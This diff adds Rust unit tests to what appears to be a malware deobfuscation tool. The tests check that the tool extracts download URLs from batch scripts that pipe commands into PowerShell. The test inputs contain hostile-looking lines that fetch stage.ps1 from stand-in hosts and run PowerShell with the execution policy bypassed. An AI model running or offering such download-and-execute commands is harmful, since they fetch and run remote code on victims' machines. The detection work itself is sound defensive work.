@@ -18770,6 +18770,45 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn piped_echo_to_powershell_stdin_queues_script_payload() {
+        let report = analyze(
+            br#"set PAYLOAD=Invoke-WebRequest https://piped-ps-stdin.example/stage.ps1
+echo %PAYLOAD% | powershell.exe -NoProfile -ExecutionPolicy Bypass -"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://piped-ps-stdin.example/stage.ps1")),
+            "piped PowerShell stdin payload was not extracted: {:?}\n{}",
+            report.extracted_ps1_normalized,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn piped_echo_to_variable_powershell_stdin_queues_script_payload() {
+        let report = analyze(
+            br#"set PAYLOAD=Invoke-WebRequest https://piped-var-ps-stdin.example/stage.ps1
+set RUN=cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -
+echo %PAYLOAD% | %RUN%"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://piped-var-ps-stdin.example/stage.ps1")),
+            "variable-target piped PowerShell stdin payload was not extracted: {:?}\n{}",
+            report.extracted_ps1_normalized,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn powershell_cp_positional_preserves_download_provenance() {
         let report = analyze(
             br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-cp-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
